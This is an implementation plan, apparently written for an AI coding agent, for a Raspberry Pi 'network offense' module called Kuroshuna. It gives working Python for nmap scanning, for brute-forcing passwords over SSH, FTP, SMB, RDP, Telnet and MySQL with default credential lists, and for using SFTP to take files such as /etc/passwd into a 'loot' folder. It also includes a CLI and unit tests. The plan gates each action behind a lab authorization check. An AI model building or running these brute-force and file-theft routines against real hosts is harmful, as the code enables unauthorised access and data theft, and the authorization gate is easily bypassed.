# Kuroshuna Phase 3 — Tier A Network Offense (Bjorn-style) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Pi-side network offense — gated nmap recon, multi-protocol credential brute-force (SSH/FTP/SMB/RDP/Telnet/SQL), and SSH file-steal — every action authorized per-host through the Phase 1 gate.

**Architecture:** New module `backend/offense/net_offense.py`. `NetworkOffense` checks `Gate.is_authorized(host, action)` before any packet. The nmap runner, per-protocol login attempters, and the SFTP stealer are **injected callables** (real implementations are lazy — they import paramiko/impacket/pymysql only at attempt time, telnet uses a raw socket since `telnetlib` is gone in py3.13+). So the orchestration, gating, and wordlist logic are fully unit-testable with mock clients and NO offensive deps installed. The heavy deps live in a separate `requirements-offense.txt`. The gate makes untargeted scanning impossible — any host not in `approved_targets`/auto-hostiles is denied.

**Tech Stack:** Python 3, the Phase 1 `kuma_core.authz.Gate`. Real attempts (on-device only) use: nmap (system binary), paramiko (SSH/SFTP), impacket (SMB), pymysql (SQL), xfreerdp (RDP, subprocess), raw socket (Telnet).

**How to run tests:** from `backend/`: `python -m pytest tests/test_net_offense.py -v`

**Spec:** `docs/superpowers/specs/2026-06-09-kuroshuna-offensive-mode-design.md` (§ "Tier A — Targeted offense", network bullet). Depends on Phase 1 (`kuma_core.authz.Gate`).

---

## File Structure

- Create: `backend/offense/net_offense.py` — `NetworkOffense` + result dataclasses + wordlists + lazy protocol attempters + nmap/sftp defaults + CLI.
- Create: `backend/tests/test_net_offense.py` — unit tests (mock attempters/scanner/stealer + injected `Gate`, `tmp_path`).
- Create: `backend/requirements-offense.txt` — heavy deps, install on the Pi only.
- Modify: `.gitignore` — ignore `backend/data/loot/` (stolen files).

`NetworkOffense.__init__(gate, *, attempters=None, scanner=None, stealer=None, dry_run=False)` — everything network-touching is injectable.

Shared contract used across tasks:
- `DEFAULT_PORTS = {"ssh":22,"ftp":21,"smb":445,"rdp":3389,"telnet":23,"sql":3306}`
- A protocol attempter is `fn(host:str, port:int, user:str, pwd:str, timeout:float) -> bool` (True == valid creds).
- `BruteResult(ok, reason, proto, host, found, attempts, dry_run=False)` where `found: list[tuple[str,str]]`.
- `ScanResult(ok, reason, host, open_ports, dry_run=False, detail="")`.
- `StealResult(ok, reason, host, files, dry_run=False)`.
- Authorization target is always the **host** (IP). The gate is checked ONCE per action, before the credential loop / scan / steal.

---

### Task 1: package module + wordlists (built-in defaults + config override)

**Files:**
- Create: `backend/offense/net_offense.py`
- Test: `backend/tests/test_net_offense.py`

- [ ] **Step 1: Write the failing test**

```python
# backend/tests/test_net_offense.py
"""Unit tests for Tier A network offense (no targets/deps; clients injected)."""
from offense.net_offense import DEFAULT_PASSWORDS, DEFAULT_USERS, load_wordlists


def test_default_wordlists_nonempty():
    assert "root" in DEFAULT_USERS
    assert "admin" in DEFAULT_USERS
    assert len(DEFAULT_PASSWORDS) >= 5
    users, passwords = load_wordlists()
    assert users == DEFAULT_USERS
    assert passwords == DEFAULT_PASSWORDS


def test_wordlist_config_override(tmp_path):
    ul = tmp_path / "u.txt"; ul.write_text("alice\nbob\n", encoding="utf-8")
    pl = tmp_path / "p.txt"; pl.write_text("hunter2\n\n  spaces  \n", encoding="utf-8")
    users, passwords = load_wordlists({"bruteforce": {"userlist": str(ul),
                                                      "passlist": str(pl)}})
    assert users == ["alice", "bob"]
    assert passwords == ["hunter2", "spaces"]      # blank lines dropped, trimmed
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'offense.net_offense'`

- [ ] **Step 3: Write minimal implementation**

```python
# backend/offense/net_offense.py
"""Tier A network offense (Pi/LAN, Bjorn-style): gated nmap recon + multi-protocol
credential brute-force (SSH/FTP/SMB/RDP/Telnet/SQL) + SSH file-steal. Every action
authorizes the HOST through kuma_core.authz.Gate BEFORE any packet is sent. The nmap
runner, per-protocol attempters, and the SFTP stealer are INJECTED so this is unit-
testable without targets or the heavy deps; real implementations lazy-import
paramiko/impacket/pymysql (and use a raw socket for telnet) only at attempt time.
Untargeted scanning is impossible: the gate denies any host not in approved_targets/
auto-hostiles.
"""
from __future__ import annotations

from dataclasses import dataclass, field

DEFAULT_PORTS = {"ssh": 22, "ftp": 21, "smb": 445, "rdp": 3389,
                 "telnet": 23, "sql": 3306}

# Small, lab-proof default credential lists. Override via lab_targets
# bruteforce.userlist / bruteforce.passlist (paths to bigger wordlists).
DEFAULT_USERS = ["root", "admin", "user", "pi", "administrator", "guest"]
DEFAULT_PASSWORDS = ["root", "admin", "password", "toor", "raspberry",
                     "123456", "admin123", "", "guest"]


def _read_list(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        return [ln.strip() for ln in fh if ln.strip()]


def load_wordlists(cfg: dict | None = None) -> tuple[list[str], list[str]]:
    users, passwords = list(DEFAULT_USERS), list(DEFAULT_PASSWORDS)
    bf = (cfg or {}).get("bruteforce", {})
    if bf.get("userlist"):
        users = _read_list(bf["userlist"])
    if bf.get("passlist"):
        passwords = _read_list(bf["passlist"])
    return users, passwords
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/net_offense.py backend/tests/test_net_offense.py
git commit -m "feat(offense): network-offense wordlists (built-in + config override)"
```

---

### Task 2: NetworkOffense.bruteforce — gated, injected attempter

**Files:**
- Modify: `backend/offense/net_offense.py`
- Test: `backend/tests/test_net_offense.py`

- [ ] **Step 1: Write the failing test**

```python
from kuma_core.authz import Gate
from offense.net_offense import BruteResult, NetworkOffense


def _armed_gate(tmp_path, **extra):
    cfg = {"lab_mode": True, "kuroshuna_armed": True, "approved_targets": []}
    cfg.update(extra)
    return Gate(config=cfg, audit_file=tmp_path / "audit.jsonl")


def test_bruteforce_finds_creds_and_stops(tmp_path):
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    # attempter that accepts root/toor only
    attempts = []
    def fake(host, port, user, pwd, timeout):
        attempts.append((user, pwd))
        return user == "root" and pwd == "toor"
    no = NetworkOffense(gate=g, attempters={"ssh": fake})
    res = no.bruteforce("192.168.50.162", "ssh",
                        users=["root"], passwords=["x", "toor", "y"])
    assert res.ok is True
    assert res.found == [("root", "toor")]
    assert ("root", "y") not in attempts        # stopped after success
    assert res.attempts == 2                      # x (fail), toor (hit)


def test_bruteforce_unauthorized_makes_no_attempts(tmp_path):
    g = _armed_gate(tmp_path)                      # nothing approved
    attempts = []
    no = NetworkOffense(gate=g,
                        attempters={"ssh": lambda *a: attempts.append(a) or True})
    res = no.bruteforce("10.0.0.9", "ssh", users=["root"], passwords=["root"])
    assert res.ok is False
    assert "not in authorized set" in res.reason
    assert attempts == []                          # never connected


def test_bruteforce_unknown_protocol(tmp_path):
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    no = NetworkOffense(gate=g, attempters={"ssh": lambda *a: True})
    res = no.bruteforce("192.168.50.5", "gopher")
    assert res.ok is False
    assert "unknown proto" in res.reason


def test_bruteforce_dry_run_no_attempts(tmp_path):
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    attempts = []
    no = NetworkOffense(gate=g, attempters={"ssh": lambda *a: attempts.append(a) or True},
                        dry_run=True)
    res = no.bruteforce("192.168.50.5", "ssh", users=["root"], passwords=["root"])
    assert res.ok is True and res.dry_run is True
    assert attempts == []
    assert res.attempts == 0
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_net_offense.py -k bruteforce -v`
Expected: FAIL — `NetworkOffense` / `BruteResult` undefined

- [ ] **Step 3: Write minimal implementation**

Add the dataclass and class (attempters registry filled in Task 3 — for now default to an empty dict so injected attempters drive the tests):

```python
@dataclass
class BruteResult:
    ok: bool
    reason: str
    proto: str
    host: str
    found: list = field(default_factory=list)   # list[tuple[str, str]]
    attempts: int = 0
    dry_run: bool = False


class NetworkOffense:
    def __init__(self, gate, *, attempters=None, scanner=None, stealer=None,
                 dry_run: bool = False) -> None:
        self.gate = gate
        # ATTEMPTERS (the real registry) is wired in Task 3; injection wins.
        self.attempters = attempters if attempters is not None else dict(ATTEMPTERS)
        self._scanner = scanner
        self._stealer = stealer
        self.dry_run = dry_run

    def bruteforce(self, host: str, proto: str, *, port: int | None = None,
                   users=None, passwords=None, timeout: float = 4.0,
                   stop_on_success: bool = True, cfg: dict | None = None) -> BruteResult:
        proto = proto.lower()
        if proto not in self.attempters:
            return BruteResult(False, f"unknown proto: {proto}", proto, host)
        allowed, why = self.gate.is_authorized(host, f"brute_{proto}")
        if not allowed:
            return BruteResult(False, why, proto, host)
        if users is None or passwords is None:
            du, dp = load_wordlists(cfg)
            users = users or du
            passwords = passwords or dp
        port = port or DEFAULT_PORTS.get(proto, 0)
        if self.dry_run:
            return BruteResult(True, "dry-run (no tx)", proto, host, dry_run=True)
        attempt = self.attempters[proto]
        found, n = [], 0
        for user in users:
            for pwd in passwords:
                n += 1
                try:
                    hit = attempt(host, port, user, pwd, timeout)
                except Exception:  # a single failed attempt must not abort the run
                    hit = False
                if hit:
                    found.append((user, pwd))
                    if stop_on_success:
                        self.gate.audit({"tier": "A", "action": f"brute_{proto}",
                                         "target": host, "allowed": True,
                                         "reason": f"creds found in {n} attempts"})
                        return BruteResult(True, why, proto, host, found, n)
        self.gate.audit({"tier": "A", "action": f"brute_{proto}", "target": host,
                         "allowed": True,
                         "reason": f"{len(found)} creds in {n} attempts"})
        return BruteResult(True, why if found else "no creds found",
                           proto, host, found, n)
```

Add a temporary module-level `ATTEMPTERS = {}` near the constants (Task 3 replaces it with the real registry). Place it right after `DEFAULT_PASSWORDS` block:

```python
ATTEMPTERS: dict = {}   # real protocol attempters wired in Task 3
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/net_offense.py backend/tests/test_net_offense.py
git commit -m "feat(offense): NetworkOffense.bruteforce - gated, injected attempter, audited"
```

---

### Task 3: real protocol attempters (lazy) + registry

**Files:**
- Modify: `backend/offense/net_offense.py`
- Test: `backend/tests/test_net_offense.py`

- [ ] **Step 1: Write the failing test**

```python
from offense.net_offense import ATTEMPTERS


def test_all_six_protocols_registered():
    assert set(ATTEMPTERS) == {"ssh", "ftp", "smb", "rdp", "telnet", "sql"}
    for fn in ATTEMPTERS.values():
        assert callable(fn)


def test_default_registry_used_when_not_injected(tmp_path):
    # No attempters injected -> NetworkOffense adopts the real ATTEMPTERS registry.
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    no = NetworkOffense(gate=g)
    assert set(no.attempters) == {"ssh", "ftp", "smb", "rdp", "telnet", "sql"}


def test_bruteforce_dispatches_to_named_protocol(tmp_path):
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    called = {}
    def make(tag):
        def fn(host, port, user, pwd, timeout):
            called["tag"] = tag; called["port"] = port; return False
        return fn
    no = NetworkOffense(gate=g, attempters={k: make(k) for k in DEFAULT_PORTS})
    no.bruteforce("192.168.50.5", "smb", users=["x"], passwords=["y"])
    assert called["tag"] == "smb"
    assert called["port"] == 445          # default SMB port used
```

(Add `from offense.net_offense import DEFAULT_PORTS` to the imports if not present.)

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_net_offense.py -k "protocols or registry or dispatches" -v`
Expected: FAIL — `ATTEMPTERS` empty / missing keys

- [ ] **Step 3: Write minimal implementation**

Replace the temporary `ATTEMPTERS = {}` with the real lazy attempters. Add these functions (each imports its heavy dep INSIDE the body so the module stays importable without them), then the registry:

```python
def _ssh_try(host, port, user, pwd, timeout):
    import paramiko  # lazy
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(host, port=port, username=user, password=pwd, timeout=timeout,
                  allow_agent=False, look_for_keys=False, banner_timeout=timeout)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False
    finally:
        try:
            c.close()
        except Exception:
            pass


def _ftp_try(host, port, user, pwd, timeout):
    import ftplib  # stdlib
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(user, pwd)
        ftp.quit()
        return True
    except Exception:
        return False


def _telnet_try(host, port, user, pwd, timeout):
    # telnetlib was removed in Python 3.13; do a minimal raw-socket login.
    import socket
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)

        def _read_until(token: bytes) -> bytes:
            buf = b""
            try:
                while token not in buf.lower():
                    chunk = s.recv(256)
                    if not chunk:
                        break
                    buf += chunk
            except socket.timeout:
                pass
            return buf

        _read_until(b"login:")
        s.sendall(user.encode() + b"\r\n")
        _read_until(b"password:")
        s.sendall(pwd.encode() + b"\r\n")
        resp = _read_until(b"$")  # crude: a shell prompt suggests success
        s.close()
        low = resp.lower()
        return b"incorrect" not in low and b"failed" not in low and b"login:" not in low
    except Exception:
        return False


def _smb_try(host, port, user, pwd, timeout):
    from impacket.smbconnection import SMBConnection  # lazy
    try:
        conn = SMBConnection(host, host, sess_port=port, timeout=timeout)
        conn.login(user, pwd)
        conn.logoff()
        return True
    except Exception:
        return False


def _rdp_try(host, port, user, pwd, timeout, runner=None):
    # Uses xfreerdp /auth-only (exit 0 == valid creds). runner injectable for tests.
    import subprocess
    cmd = ["xfreerdp", f"/v:{host}:{port}", f"/u:{user}", f"/p:{pwd}",
           "/auth-only", "/cert:ignore"]
    run = runner or (lambda: subprocess.run(
        cmd, capture_output=True, timeout=timeout + 5).returncode)
    try:
        return run() == 0
    except Exception:
        return False


def _sql_try(host, port, user, pwd, timeout):
    import pymysql  # lazy (MySQL/MariaDB)
    try:
        conn = pymysql.connect(host=host, port=port, user=user, password=pwd,
                               connect_timeout=int(timeout))
        conn.close()
        return True
    except Exception:
        return False


ATTEMPTERS = {
    "ssh": _ssh_try, "ftp": _ftp_try, "smb": _smb_try,
    "rdp": _rdp_try, "telnet": _telnet_try, "sql": _sql_try,
}
```

NOTE: keep `ATTEMPTERS` defined ABOVE the `NetworkOffense` class (which references it in `__init__`). If the class is below, move the registry up; if Python complains about forward reference, the registry must be defined before the class body executes `dict(ATTEMPTERS)` — it's only referenced at call time inside `__init__`, so a module-level definition anywhere before first instantiation is fine, but define it before the class for clarity.

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: PASS (all green; real attempters never invoked — injected mocks drive tests)

- [ ] **Step 5: Commit**

```bash
git add backend/offense/net_offense.py backend/tests/test_net_offense.py
git commit -m "feat(offense): lazy SSH/FTP/SMB/RDP/Telnet/SQL attempters + registry"
```

---

### Task 4: NetworkOffense.scan — gated nmap, injected runner

**Files:**
- Modify: `backend/offense/net_offense.py`
- Test: `backend/tests/test_net_offense.py`

- [ ] **Step 1: Write the failing test**

```python
from offense.net_offense import ScanResult, parse_nmap_ports


def test_parse_nmap_ports():
    sample = (
        "Starting Nmap\n"
        "22/tcp open ssh\n"
        "80/tcp closed http\n"
        "445/tcp open microsoft-ds\n"
        "Nmap done\n")
    assert parse_nmap_ports(sample) == [22, 445]


def test_scan_authorized_uses_runner(tmp_path):
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    no = NetworkOffense(gate=g, scanner=lambda host, ports, timeout: [22, 445])
    res = no.scan("192.168.50.162")
    assert res.ok is True
    assert res.open_ports == [22, 445]


def test_scan_unauthorized_does_not_run(tmp_path):
    ran = []
    g = _armed_gate(tmp_path)
    no = NetworkOffense(gate=g, scanner=lambda *a: ran.append(a) or [])
    res = no.scan("8.8.8.8")
    assert res.ok is False
    assert "not in authorized set" in res.reason
    assert ran == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_net_offense.py -k scan -v`
Expected: FAIL — no `scan` / `parse_nmap_ports` / `ScanResult`

- [ ] **Step 3: Write minimal implementation**

Add the dataclass, parser, default runner, and method:

```python
@dataclass
class ScanResult:
    ok: bool
    reason: str
    host: str
    open_ports: list = field(default_factory=list)
    dry_run: bool = False
    detail: str = ""


def parse_nmap_ports(output: str) -> list[int]:
    ports = []
    for line in output.splitlines():
        line = line.strip()
        if "/tcp" in line and " open" in line:
            try:
                ports.append(int(line.split("/", 1)[0]))
            except ValueError:
                continue
    return ports


def _nmap_scan(host, ports, timeout):
    import subprocess
    out = subprocess.run(
        ["nmap", "-Pn", "-T4", "-p", ports, host],
        capture_output=True, text=True, timeout=timeout).stdout
    return parse_nmap_ports(out)
```

Add to `NetworkOffense`:

```python
    def scan(self, host: str, ports: str = "1-1024", timeout: float = 120.0) -> ScanResult:
        allowed, why = self.gate.is_authorized(host, "scan")
        if not allowed:
            return ScanResult(False, why, host)
        if self.dry_run:
            return ScanResult(True, "dry-run (no tx)", host, dry_run=True,
                              detail=f"would nmap {host} ports {ports}")
        runner = self._scanner or _nmap_scan
        open_ports = runner(host, ports, timeout)
        return ScanResult(True, why, host, open_ports,
                          detail=f"{len(open_ports)} open")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/net_offense.py backend/tests/test_net_offense.py
git commit -m "feat(offense): NetworkOffense.scan - gated nmap + port parser"
```

---

### Task 5: NetworkOffense.steal_ssh — gated SFTP, injected stealer

**Files:**
- Modify: `backend/offense/net_offense.py`
- Test: `backend/tests/test_net_offense.py`

- [ ] **Step 1: Write the failing test**

```python
from offense.net_offense import StealResult


def test_steal_authorized_uses_stealer(tmp_path):
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    got = {}
    def fake(host, port, user, pwd, remote_paths, out_dir, timeout):
        got["args"] = (host, port, user, list(remote_paths))
        return ["/etc/passwd"]
    no = NetworkOffense(gate=g, stealer=fake)
    res = no.steal_ssh("192.168.50.162", "root", "toor", ["/etc/passwd"],
                       out_dir=tmp_path / "loot")
    assert res.ok is True
    assert res.files == ["/etc/passwd"]
    assert got["args"][0] == "192.168.50.162"


def test_steal_unauthorized_no_connection(tmp_path):
    ran = []
    g = _armed_gate(tmp_path)
    no = NetworkOffense(gate=g, stealer=lambda *a: ran.append(a) or [])
    res = no.steal_ssh("1.1.1.1", "root", "x", ["/etc/passwd"], out_dir=tmp_path)
    assert res.ok is False
    assert ran == []


def test_steal_dry_run(tmp_path):
    ran = []
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    no = NetworkOffense(gate=g, stealer=lambda *a: ran.append(a) or [], dry_run=True)
    res = no.steal_ssh("192.168.50.5", "root", "x", ["/etc/passwd"], out_dir=tmp_path)
    assert res.ok is True and res.dry_run is True
    assert ran == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_net_offense.py -k steal -v`
Expected: FAIL — no `steal_ssh` / `StealResult`

- [ ] **Step 3: Write minimal implementation**

```python
@dataclass
class StealResult:
    ok: bool
    reason: str
    host: str
    files: list = field(default_factory=list)
    dry_run: bool = False


def _sftp_get(host, port, user, pwd, remote_paths, out_dir, timeout):
    import paramiko  # lazy
    from pathlib import Path
    Path(out_dir).mkdir(parents=True, exist_ok=True)
    t = paramiko.Transport((host, port))
    got = []
    try:
        t.connect(username=user, password=pwd)
        sftp = paramiko.SFTPClient.from_transport(t)
        for rp in remote_paths:
            local = Path(out_dir) / (host.replace(".", "_") + "_" + Path(rp).name)
            sftp.get(rp, str(local))
            got.append(rp)
    finally:
        t.close()
    return got
```

Add to `NetworkOffense`:

```python
    def steal_ssh(self, host: str, user: str, pwd: str, remote_paths,
                  out_dir=None, port: int = 22, timeout: float = 10.0) -> StealResult:
        from kuma_core.config import DATA_DIR
        allowed, why = self.gate.is_authorized(host, "steal")
        if not allowed:
            return StealResult(False, why, host)
        if self.dry_run:
            return StealResult(True, "dry-run (no tx)", host, dry_run=True)
        out = out_dir or (DATA_DIR / "loot")
        stealer = self._stealer or _sftp_get
        try:
            files = stealer(host, port, user, pwd, remote_paths, out, timeout)
        except Exception as e:  # noqa: BLE001
            return StealResult(False, f"steal error: {e}", host)
        self.gate.audit({"tier": "A", "action": "steal", "target": host,
                         "allowed": True, "reason": f"{len(files)} files"})
        return StealResult(True, why, host, files)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/net_offense.py backend/tests/test_net_offense.py
git commit -m "feat(offense): NetworkOffense.steal_ssh - gated SFTP exfil, injected"
```

---

### Task 6: CLI entrypoint

**Files:**
- Modify: `backend/offense/net_offense.py`
- Test: `backend/tests/test_net_offense.py`

- [ ] **Step 1: Write the failing test**

```python
from offense.net_offense import build_args, run_cli


def test_cli_brute_dry_run(tmp_path, capsys):
    g = _armed_gate(tmp_path, approved_targets=["192.168.50.0/24"])
    calls = []
    no = NetworkOffense(gate=g, attempters={"ssh": lambda *a: calls.append(a) or True},
                        dry_run=True)
    args = build_args(["--host", "192.168.50.5", "--brute", "ssh", "--no-tx"])
    rc = run_cli(args, no=no)
    assert rc == 0
    assert calls == []
    assert "dry-run" in capsys.readouterr().out.lower()


def test_cli_requires_action(tmp_path):
    g = _armed_gate(tmp_path)
    no = NetworkOffense(gate=g, dry_run=True)
    args = build_args(["--host", "192.168.50.5"])
    assert run_cli(args, no=no) == 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_net_offense.py -k cli -v`
Expected: FAIL — no `build_args` / `run_cli`

- [ ] **Step 3: Write minimal implementation**

```python
def build_args(argv):
    import argparse
    p = argparse.ArgumentParser(
        prog="offense.net_offense",
        description="Kuroshuna Tier A network offense: gated scan/brute/steal.")
    p.add_argument("--host", required=True, help="target host/IP (must be authorized)")
    p.add_argument("--scan", action="store_true", help="nmap port scan")
    p.add_argument("--brute", metavar="PROTO",
                   help="brute one of: " + ",".join(DEFAULT_PORTS))
    p.add_argument("--steal", nargs="+", metavar="REMOTE_PATH",
                   help="SFTP-steal paths (needs --user/--pass)")
    p.add_argument("--user", default="root")
    p.add_argument("--passwd", default="root")
    p.add_argument("--ports", default="1-1024")
    p.add_argument("--no-tx", dest="no_tx", action="store_true",
                   help="dry run: authorize but never connect")
    return p.parse_args(argv)


def run_cli(args, no=None) -> int:
    if not (args.scan or args.brute or args.steal):
        print("error: specify --scan, --brute PROTO, and/or --steal PATH...", flush=True)
        return 2
    if no is None:
        from kuma_core.authz import Gate
        no = NetworkOffense(gate=Gate(), dry_run=args.no_tx)
    rc = 0
    if args.scan:
        r = no.scan(args.host, ports=args.ports)
        print(f"[scan] ok={r.ok} {r.reason} open={r.open_ports} {r.detail}", flush=True)
        rc = rc or (0 if r.ok else 1)
    if args.brute:
        r = no.bruteforce(args.host, args.brute)
        print(f"[brute:{args.brute}] ok={r.ok} {r.reason} found={r.found} "
              f"attempts={r.attempts}{' (dry-run)' if r.dry_run else ''}", flush=True)
        rc = rc or (0 if r.ok else 1)
    if args.steal:
        r = no.steal_ssh(args.host, args.user, args.passwd, args.steal)
        print(f"[steal] ok={r.ok} {r.reason} files={r.files}"
              f"{' (dry-run)' if r.dry_run else ''}", flush=True)
        rc = rc or (0 if r.ok else 1)
    return rc


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(run_cli(build_args(sys.argv[1:])))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/net_offense.py backend/tests/test_net_offense.py
git commit -m "feat(offense): net_offense CLI (--scan/--brute/--steal/--no-tx)"
```

---

### Task 7: offense requirements + ignore loot

**Files:**
- Create: `backend/requirements-offense.txt`
- Modify: `.gitignore`
- Test: `backend/tests/test_net_offense.py`

- [ ] **Step 1: Write the failing test**

```python
from pathlib import Path


def test_offense_requirements_and_loot_ignored():
    root = Path(__file__).resolve().parents[2]
    reqs = (root / "backend" / "requirements-offense.txt").read_text(encoding="utf-8")
    for dep in ("paramiko", "impacket", "pymysql"):
        assert dep in reqs
    gi = (root / ".gitignore").read_text(encoding="utf-8")
    assert "backend/data/loot/" in gi
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_net_offense.py -k requirements -v`
Expected: FAIL — file/pattern missing

- [ ] **Step 3: Create `backend/requirements-offense.txt`:**

```text
# KUMA Kuroshuna offensive deps - install ONLY on the lab Pi, never required for
# the core backend or the test suite (all are lazy-imported at attempt time).
#   pip install -r requirements-offense.txt
# Plus system binaries: nmap, xfreerdp (RDP). Telnet uses a raw socket (no dep).
paramiko>=3.4        # SSH brute + SFTP steal
impacket>=0.11       # SMB brute
pymysql>=1.1         # SQL (MySQL/MariaDB) brute
```

- [ ] **Step 4: Edit `.gitignore`** — add:

```gitignore
# Exfiltrated files from steal_ssh (sensitive; local only)
backend/data/loot/
```

- [ ] **Step 5: Run test to verify it passes**

Run: `python -m pytest tests/test_net_offense.py -v`
Expected: PASS (full file green)

- [ ] **Step 6: Commit**

```bash
git add backend/requirements-offense.txt .gitignore backend/tests/test_net_offense.py
git commit -m "chore(offense): offensive deps file + gitignore loot"
```

---

## Phase exit criteria

- `python -m pytest tests/test_net_offense.py -v` → all green; full suite still green.
- Module imports with NONE of paramiko/impacket/pymysql installed (lazy imports verified by the suite running clean on the dev box).
- `NetworkOffense` exposes `scan`, `bruteforce`, `steal_ssh`; every one calls
  `Gate.is_authorized(host, action)` BEFORE any network touch; unauthorized → zero attempts.
- All six protocols registered in `ATTEMPTERS`; `--no-tx` dry-runs every action.
- Heavy deps isolated to `requirements-offense.txt`; loot dir gitignored.

## On-device validation (Jax, on the Pi — needs real targets + deps)

1. `pip install -r backend/requirements-offense.txt`; ensure `nmap` (+ `xfreerdp` for RDP) on PATH.
2. Populate `lab_targets.json` (`approved_targets` = your Bjorn rig / lab subnet; `own_infra` = Pi/Lily/APs; arm lab_mode+kuroshuna_armed).
3. Dry-run each: `sudo ./.venv/bin/python -m offense.net_offense --host <rig> --scan --brute ssh --no-tx` → confirm authorized, no connections, audit lines.
4. Live scan, then a real SSH brute against your own rig with the default list; confirm found creds + audit.
5. Confirm a NON-approved host (e.g. 8.8.8.8) is refused with zero attempts.

## Next phases (separate plans)

- **Phase 4** — Tier B broadcast (deauth-flood/beacon/BLE-spam/assoc-flood) behind `broadcast_allowed` + time-box + footprint limits.
- **Phase 5** — autonomous orchestrator (`detectors/kuroshuna.py`) iterating the authorized set across RF + network.
- **Phase 2b / UI** — T-Deck ESP32 RF + `/api/kuroshuna/authorize`; Kuroshuna skin + on-device arm.
